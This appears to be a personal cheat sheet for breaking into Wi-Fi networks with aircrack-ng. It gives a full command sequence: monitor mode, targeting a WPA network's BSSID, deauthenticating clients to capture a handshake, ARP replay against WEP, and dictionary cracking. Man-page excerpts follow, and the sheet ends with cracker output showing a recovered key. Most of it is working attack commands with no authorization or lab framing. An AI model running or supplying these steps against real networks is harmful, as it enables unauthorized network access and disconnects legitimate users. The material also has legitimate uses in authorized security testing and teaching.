iwconfig
sudo airmon-ng start wlan0
sudo airodump-ng -a -t WPA mon0
sudo airodump-ng -d xx:xx:xx:E4:F5:5A -c 11 -w kashu.org --ignore-negative-one mon0
sudo aireplay-ng -0 10 -a xx:xx:xx:E4:F5:5A -c xx:xx:xx:BA:82:FD --ignore-negative-one mon0
or WEP
sudo aireplay-ng -3 -b xx:xx:xx:6F:64:1E -h xx:xx:xx:c8:58:A0 mon0
sudo aircrack-ng kashu.org.cap -w ~/dictionary.file






airodump-ng # a wireless packet capture tool for aircrack-ng
#SYNOPSIS
	airodump-ng [options] <interface name>

#DESCRIPTION
	airodump-ng is used for packet capturing of raw 802.11 frames for the intent of using them with aircrack-ng. If you have a GPS receiver connected to the computer, airodump-ng is capable of logging the coordinates of the found access points. Additionally, airodump-ng writes out a text file containing the details of all access points and clients seen.

-a     It will only show associated clients.

-c <channel>[,<channel>[,...]], --channel <channel>[,<channel>[,...]]
	Indicate the channel(s) to listen to. By default airodump-ng hop on all 2.4GHz channels.

-d <bssid>, --bssid <bssid>
	It will only show networks, matching the given bssid.

-t <OPN|WEP|WPA|WPA1|WPA2>, --encrypt <OPN|WEP|WPA|WPA1|WPA2>
	It will only show networks matching the given encryption. May be specified more than once: '-t OPN -t WPA2'

-w <prefix>, --write <prefix>
	Is  the  dump file prefix to use. If this option is not given, it will only show data on the screen. Beside this file a CSV file with the same filename as the capture will be created.

-u <secs>, --update <secs>
	Delay <secs> seconds delay between display updates (default: 1 second). Useful for slow CPU.

--ignore-negative-one
	Removes the message that says 'fixed channel <interface>: -1'.



aireplay-ng - inject packets into a wireless network to generate traffic
#SYNOPSIS
	aireplay-ng [options] <replay interface>
#DESCRIPTION
	aireplay-ng is used to inject/replay frames. The primary function is to generate traffic for the later use in aircrack-ng for cracking the WEP and WPA-PSK keys. There are different attacks which can cause deauthentications for the purpose of capturing WPA handshake data, fake authentications, Interactive packet replay, hand-crafted ARP request injection and ARP-request reinjection. With the packetforge-ng tool it's possible to create arbitrary frames.

aireplay-ng supports single-NIC injection/monitor.This feature needs driver patching.



-0 <count>, --deauth=<count>
              This attack sends deauthentication packets to one or more clients which are  currently  associated  with  a  particular  access
              point.  Deauthenticating  clients can be done for a number of reasons: Recovering a hidden ESSID. This is an ESSID which is not
              being broadcast. Another term for this is "cloaked" or Capturing WPA/WPA2 handshakes by forcing clients  to  reauthenticate  or
              Generate  ARP  requests (Windows clients sometimes flush their ARP cache when disconnected).  Of course, this attack is totally
              useless if there are no associated wireless client or on fake authentications.

 -a <bssid>
              Set Access Point MAC address.

       -c <dmac>
              Set destination MAC address.


#Step 2





#Step 5
Reading packets, please wait...

                                 Aircrack-ng 1.1


                   [00:00:00] 4 keys tested (363.01 k/s)


                      KEY FOUND! [ LYLQSKWJNCZ.1314109 ]


      Master Key     : AA 4B DC C1 0B F2 3E E9 98 ED C7 69 8D 5F E5 7E 
                       22 37 E2 1A C4 77 4C F8 C9 8C AD 7C 08 8B A2 C0 

      Transient Key  : 70 68 78 5F F0 5F EE E9 73 D0 3C 75 DB 49 8C BE 
                       E0 F4 8D 4F F0 49 54 6F 44 2A 12 B7 CB 02 C5 0A 
                       3A 03 B6 23 A3 40 00 63 2F 2C D8 0F AE F4 AD 4B 
                       2B D6 45 71 FE 89 7B 41 C1 2D B0 89 81 C6 05 B7 

      EAPOL HMAC     : 37 43 FE A7 6A C5 BD 22 53 B2 27 D0 E9 DB 1A BA 

